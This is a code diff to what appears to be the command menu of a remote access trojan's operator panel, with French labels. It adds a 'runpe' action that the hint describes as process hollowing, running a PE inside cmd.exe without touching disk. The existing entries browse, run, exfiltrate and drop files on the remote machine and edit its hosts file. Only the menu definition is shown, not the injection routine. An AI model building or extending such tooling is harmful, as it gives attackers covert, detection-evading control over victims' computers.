@@ -48,6 +48,12 @@ const ACTIONS = [
       { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\\Downloads" },
       { label: "Changer de dossier", verb: "cd", prompt: "chemin du dossier" },
       { label: "Exécuter", verb: "run", prompt: "chemin du fichier" },
+      {
+        label: "Injecter en mémoire",
+        verb: "runpe",
+        prompt: "chemin du PE puis hôte optionnel",
+        hint: "process hollowing : le PE tourne dans cmd.exe, sans fichier sur le disque"
+      },
       { label: "Récupérer un fichier", verb: "download", prompt: "chemin complet" },
       { label: "Déposer depuis une URL", verb: "upload", prompt: "url puis chemin" },
       { label: "Fichier hosts", verb: "hosts" }
